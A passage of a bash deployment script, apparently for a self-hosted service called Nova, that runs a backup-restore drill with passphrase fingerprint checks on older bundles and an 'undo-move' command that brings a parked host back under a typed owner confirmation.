        return 2
        ;;
    esac
    shift
  done
  [ -n "$out" ] || out="$(bk_out_dir)"
  dir="$out"

  # ── 1. the sweep ─────────────────────────────────────────────────────────
  bk_drill_sweep || return 1

  # ── 2. the bundles. ZERO IS A FAILED DRILL, not a vacuous pass ──────────
  bundles="$(find "$dir" -maxdepth 1 -type f -name '*.tar' 2>/dev/null | LC_ALL=C sort)"
  n="$(printf '%s\n' "$bundles" | sed '/^$/d' | wc -l | tr -d ' ')"
  if [ "$n" -eq 0 ]; then
    bk_fail "there is no bundle in $dir. The question a drill answers is \"could I
       recover from disaster today\", and with nothing to recover from the answer
       is NO. That is a FAILED drill, not a drill with nothing to do."
    return 1
  fi

  # ── 3. the newest, by the stamp in its own name ─────────────────────────
  newest=""
  newest_stamp=""
  while IFS= read -r line; do
    [ -n "$line" ] || continue
    base="$(basename "$line")"
    stamp="$(bk_bundle_stamp "$base")" || {
      bk_fail "$base carries no YYYYMMDDTHHMMSSZ stamp this tool can parse. A drill
       never picks by mtime — a file copied off a removable drive carries the
       copy's time, not the backup's."
      return 1
    }
    if [ -z "$newest_stamp" ] || bk_str_ge "$stamp" "$newest_stamp"; then
      newest_stamp="$stamp"
      newest="$line"
    fi
  done <<EOF
$bundles
EOF

  now="$(date +%s)"
  age="$(bk_stamp_epoch "$newest_stamp")" || age=""
  if [ -n "$age" ]; then
    age=$(((now - age) / 86400))
  fi
  printf 'drill: %s bundle(s) in %s; the newest is %s\n' "$n" "$dir" "$(basename "$newest")"
  if [ -n "$age" ]; then
    printf '       stamped %s, %s day(s) old\n' "$newest_stamp" "$age"
  else
    printf '       stamped %s\n' "$newest_stamp"
  fi

  # ── 4. the drill itself ──────────────────────────────────────────────────
  bk_restore_run "$newest" --drill || return 1

  # ── 5. the cross-check a drill alone cannot surface ─────────────────────
  #
  # Every OLDER bundle's cleartext passphrase_fingerprint, against what the
  # CONFIGURED passphrase derives under THAT bundle's own kat.enc salt (§7.4,
  # s41/rulings.md C). No decryption, and no passphrase for those bundles is
  # needed. Any that differ need the PREVIOUS passphrase, and the operator
  # should know that before he needs them — which is the one thing a drill of
  # the newest bundle can never tell him.
  pw_source="$(nova_passphrase_source)"
  rc=0
  pw="$(resolve_passphrase)" || rc=$?
  if [ "$rc" -ne 0 ] || [ -z "$pw" ]; then
    bk_fail "the drill restored, and the configured passphrase ('$pw_source') could not
       be resolved afterwards, so the older bundles were NOT cross-checked. That
       half of the drill did not run."
    return 1
  fi
  crypto_img="$(bk_crypto_image)" || return 1
  tmp="$(mktemp -d "${TMPDIR:-/tmp}/nova-drill-fp.XXXXXX")" || return 1
  chmod 700 "$tmp"
  stale=""
  kept=0
  while IFS= read -r line; do
    [ -n "$line" ] || continue
    [ "$line" = "$newest" ] && continue
    base="$(basename "$line")"
    if ! tar -xOf "$line" kat.enc > "$tmp/kat.enc" 2>/dev/null || [ ! -s "$tmp/kat.enc" ]; then
      stale="$stale
       $base — it carries no readable kat.enc, so nothing can say which
       passphrase seals it"
      continue
    fi
    recorded="$(tar -xOf "$line" meta.json 2>/dev/null | bk_json_field passphrase_fingerprint)" || recorded=""
    fp="$(printf '%s\n' "$pw" | bk_nova -v "$tmp:/fp:ro" "$crypto_img" \
      python3 /novabundle/novabundle.py fingerprint --file /fp/kat.enc 2>/dev/null)" || fp=""
    if [ -z "$fp" ] || [ -z "$recorded" ]; then
      stale="$stale
       $base — its fingerprint could not be derived or read"
      continue
    fi
    if [ "$fp" != "$recorded" ]; then
      stale="$stale
       $base (records $recorded, this passphrase derives $fp)"
    else
      kept=$((kept + 1))
    fi
  done <<EOF
$bundles
EOF
  rm -rf "$tmp"

  # ── 6. the report ────────────────────────────────────────────────────────
  if [ -n "$stale" ]; then
    printf '\n'
    bk_fail "the newest bundle restores, AND these older bundles are not sealed with
       the passphrase configured here:$stale

       They need the PREVIOUS passphrase. Keep it, or write a fresh backup you
       can open — a bundle nobody can open is not a backup."
    return 1
  fi
  printf 'passphrases: %s older bundle(s) checked, every one sealed with the passphrase\n' "$kept"
  printf '             configured here (derived under each bundle'"'"'s own salt, no decrypt)\n'
  printf '\ndrill PASSED: %s\n' "$(basename "$newest")"
  return 0
}

# ╔══════════════════════════════════════════════════════════════════════════╗
# ║ `undo-move` (design-verdict §9.5, owner decision 3 of 2026-09-21)         ║
# ╚══════════════════════════════════════════════════════════════════════════╝
#
# The way back from a park. He was asked whether to move before this existed
# and chose to build it first, because every step of the cutover sits
# downstream of a `--move` that could otherwise stop the machine and walk
# away — and the by-hand equivalent (delete two files, start the stack by
# hand, hope) is not good enough for the one night it is needed.
#
# §9.5 wrote this verb as "it starts nothing itself". It starts things now,
# by his decision, and the ORDER is mechanical rather than a preference:
# deploy/tailscale/start.sh refuses to run containerboot while
# /config/MOVED_TO is there, so a restart with that marker still in place
# brings back everything EXCEPT the tailnet — which is the one thing he
# reaches Nova by. So MOVED_TO goes first, then the stack comes back and is
# READ BACK, and only then is deploy/.moved removed. A marker that says "this
# host is parked" is removed when the host is demonstrably not parked any
# more, never before.
#
# What it does not do: decide. It states what it found on the tailnet or that
# it could not look, says what bringing this node up will do, and takes the
# owner's typed word. Refusing outright when a peer answers is the shape
# shell-first's own critique called a "may not" — a half-dead hub answers
# `tailscale status` long after it stops serving, and the owner would then be
# deleting markers by hand at 3am, which is the whole failure this verb
# exists to prevent.

# The host's own tailscale CLI, which is NOT the sidecar's: on a parked host
# the sidecar is stopped, so `docker exec tailscale …` has nothing to ask.
# A seam, so the suite can drive both branches without a tailnet.
bk_host_tailscale() { tailscale "$@"; }
bk_have_host_tailscale() { command -v tailscale >/dev/null 2>&1; }

# One `key=value` line out of a marker file. Non-zero when the key is not
# there at all, which is different from an empty value.
bk_marker_value() {
  awk -v k="$1" '
    index($0, k "=") == 1 { print substr($0, length(k) + 2); found = 1; exit }
    END { exit (found ? 0 : 1) }
  ' "$2"
}

# Is the peer carrying DNS name $1 online, per `tailscale status --json` on
# stdin? Three ANSWERS, not two: 0 = a peer with that name is online, 1 = the
# name is there and not online, 2 = the name is not in the status at all.
# "Could not tell" is never folded into "no".
bk_peer_online() {
  tr -d '\n' | awk -v dns="$1" '
    {
      n = split($0, chunk, /\}[ \t]*,[ \t]*"/)
      for (i = 1; i <= n; i++) {
        if (index(chunk[i], "\"DNSName\"") == 0) continue
        if (index(chunk[i], dns) == 0) continue
        seen = 1
        if (chunk[i] ~ /"Online"[ \t]*:[ \t]*true/) online = 1
      }
    }
    END {
      if (online) exit 0
      if (seen) exit 1
      exit 2
    }
  '
}

cmd_undo_move() {
  local had_e=0 code=0
  case "$-" in
    *e*) had_e=1; set +e ;;
  esac
  bk_undo_move_run "$@"
  code=$?
  if [ "$had_e" -eq 1 ]; then
    set -e
  fi
  return "$code"
}

bk_undo_move_run() {
  local moved marker line bad key dns answer status rc svcs text err left

  while [ $# -gt 0 ]; do
    case "$1" in
      -h | --help)
        printf './install undo-move\n'
        printf 'Brings back a host that `./install backup --move` parked here.\n'
        return 0
        ;;
      *)
        bk_fail "undo-move: unknown option '$1'. Usage: ./install undo-move"
        return 2
        ;;
    esac
  done

  moved="$(bk_moved_marker)"
  marker="$(bk_moved_to_marker)"

  # ── 1. the marker, and what it says ──────────────────────────────────────
  if [ ! -e "$moved" ]; then
    printf 'no marker here; nothing was moved from this machine.\n'
    printf '  (%s is absent, so the postcondition this verb exists to produce\n' "$moved"
    printf '   already holds. Nothing was started, stopped or removed.)\n'
    return 0
  fi
  if [ ! -r "$moved" ]; then
    bk_fail "$moved is there and this user cannot read it. Removing a marker nobody
       could read is not something this verb may assume is safe."
    return 1
  fi
  # A line is `<key>=<value>` with a key of [a-z0-9_] and nothing else. Checking
  # only for a `=` somewhere accepts "this line is not key=value", which is
  # the sentence a corrupted marker is most likely to be.
  bad=""
  while IFS= read -r line; do
    [ -n "$line" ] || continue
    case "$line" in
      *=*)
        key="${line%%=*}"
        case "$key" in
          "" | *[!a-z0-9_]*)
            bad="$line"
            break
            ;;
        esac
        ;;
      *)
        bad="$line"
        break
        ;;
    esac
  done < "$moved"
  if [ -n "$bad" ]; then
    bk_fail "$moved carries a line this verb cannot read: '$bad'. A marker is
       key=value per line; removing one that does not parse would be removing
       something nobody here understands."
    return 1
  fi
  for key in moved_at bundle bundle_sha256 source_host tailnet_dns_name; do
    if ! bk_marker_value "$key" "$moved" >/dev/null; then
      bk_fail "$moved names no \`$key\`. Every marker \`backup --move\` writes carries
       all five keys, so this one was written by something else or truncated, and
       this verb will not remove a marker it cannot account for."
      return 1
    fi
  done

  # ── 2. print it verbatim ─────────────────────────────────────────────────
  printf 'this machine was parked by `./install backup --move`:\n\n'
  sed 's/^/  /' "$moved"
  printf '\n'

  # ── 3. liveness, stated either way ───────────────────────────────────────
  #
  # Both branches print what was found or that nothing could be found. A
  # check may state that something CANNOT be done; it may never decide that
  # it MAY NOT.
  dns="$(bk_marker_value tailnet_dns_name "$moved")" || dns=""
  if [ -z "$dns" ]; then
    printf 'the marker records no tailnet name, so there is no peer to look for.\n'
  elif ! bk_have_host_tailscale; then
    printf 'I cannot check from here whether `%s` is online: there is no host\n' "$dns"
    printf '`tailscale` CLI, and this machine'"'"'s sidecar is stopped, so there is no\n'
    printf 'tailscaled to ask.\n'
  else
    status="$(bk_host_tailscale status --json 2>/dev/null)" || status=""
    if [ -z "$status" ]; then
      printf 'I cannot check from here whether `%s` is online: `tailscale status\n' "$dns"
      printf -- '--json` on this host answered nothing.\n'
    else
      rc=0
      printf '%s' "$status" | bk_peer_online "$dns" || rc=$?
      case "$rc" in
        0) printf 'ONLINE NOW: a tailnet peer named `%s` is up. That is very likely\n           Nova, running on %s.\n' \
          "$dns" "$(bk_marker_value source_host "$moved")" ;;
        1) printf 'this tailnet knows `%s` and it is not online just now.\n' "$dns" ;;
        *) printf 'this tailnet'"'"'s status does not mention `%s` at all.\n' "$dns" ;;
      esac
    fi
  fi
  printf '\n'
  printf 'Bringing this machine up puts a tailscaled back on that node identity. If\n'
  printf 'Nova is also running on the destination, the two share one node key and\n'
  printf 'the address flaps — stop it there first.\n'
  printf '\n'
  printf 'This will: remove %s, start every service of this\n' "$marker"
  printf 'project, read each one back, and then remove %s.\n' "$moved"
  printf 'Type undo to do it, anything else to leave this machine parked: '
  answer=""
  IFS= read -r answer || answer=""
  if [ "$answer" != "undo" ]; then
    printf '\nnothing was changed: this machine is still parked, both markers are still\nin place, and nothing was started.\n'
    return 1
  fi
  printf '\n'

  # ── 4. the sidecar's marker FIRST, or the tailnet does not come back ─────
  if [ -e "$marker" ]; then
    rm -f "$marker"
    if [ -e "$marker" ]; then
      bk_fail "could not remove $marker. deploy/tailscale/start.sh refuses to start
       containerboot while it is there, so starting the stack now would bring back
       everything except the tailnet. Nothing was started; $moved is still in
       place and this machine is still parked."
      return 1
    fi
    printf 'removed %s, so the tailnet sidecar can start again\n' "$marker"
  else
    printf '%s is already gone\n' "$marker"
  fi

  # ── 5. start the whole project, and READ IT BACK ─────────────────────────
  err="$(mktemp "${TMPDIR:-/tmp}/nova-undo-move.XXXXXX")" || return 1
  text="$(bk_compose_config 2> "$err")" || {
    bk_fail "\`docker compose --profile '*' config\` failed, so nothing here can say
       which services this project has. stderr: $(tr '\n' ' ' < "$err")
       Nothing was started; $moved is still in place."
    rm -f "$err"
    return 1
  }
  rm -f "$err"
  svcs="$(printf '%s' "$text" | cfg_service_keys)"
  if [ -z "$svcs" ]; then
    bk_fail "the compose render names no service, so nothing here can say what to
       start. Nothing was started; $moved is still in place."
    return 1
  fi
  # Primed out of the render already in hand, so the read-back below selects
  # containers by this project's label without a second whole render.
  BK_PROJECT="$(printf '%s' "$text" | cfg_project_name)"
  if [ -z "$BK_PROJECT" ]; then
    bk_fail "the compose render carries no top-level \`name:\` line, so nothing here
       can select this project's containers to read them back. Nothing was
       started; $moved is still in place."
    return 1
  fi
  if ! bk_docker compose "${BK_COMPOSE_ARGS[@]}" --profile '*' up -d >/dev/null 2>&1; then
    bk_fail "\`docker compose --profile '*' up -d\` did not exit 0. This machine is
       part-way back: $marker is gone and $moved is still in place, so \`./install\`
       still refuses here. Fix what compose reported and run \`./install undo-move\`
       again."
    return 4
  fi
  # `up` exiting 0 is not "it came back", and this is the moment the verb
  # would otherwise report a state it never read. The same reading step 22
  # uses on the routine path: healthy where there is a healthcheck, running
  # where there is none, and named either way.
  # shellcheck disable=SC2086  # $svcs is a list of service names by design
  left="$(bk_wait_healthy $svcs)" || {
    bk_fail "\`docker compose up -d\` exited 0 and$left did not come back within 240s.
       This machine is part-way back: $marker is gone, $moved is still in place, and
       \`./install\` still refuses here. The last 20 log lines of each:
$(for line in $left; do
  printf '       --- %s ---\n' "$line"
  bk_docker compose "${BK_COMPOSE_ARGS[@]}" --profile '*' logs --tail 20 "$line" 2>&1 | sed 's/^/       /'
done)"
    return 4
  }
  printf 'started: %s — every one running, and every one with a healthcheck healthy\n' \
    "$(printf '%s\n' "$svcs" | sed '/^$/d' | tr '\n' ' ' | sed 's/ $//')"

  # ── 6. and only now, the marker that says this host is parked ────────────
  rm -f "$moved"
  if [ -e "$moved" ]; then
    bk_fail "the stack is running again and $moved could NOT be removed, so
       \`./install\` will still refuse on this machine. Remove it by hand."
    return 4
  fi
  printf 'removed %s\n' "$moved"
  printf '\nthis machine is no longer parked: the stack is running and both markers are\ngone. It is serving Nova again.\n'
  return 0
}

if [ "${BASH_SOURCE[0]:-$0}" = "${0}" ]; then
  printf 'deploy/backup.sh is sourced by deploy/install.sh; run `./install backup`.\n' >&2
  exit 1
fi
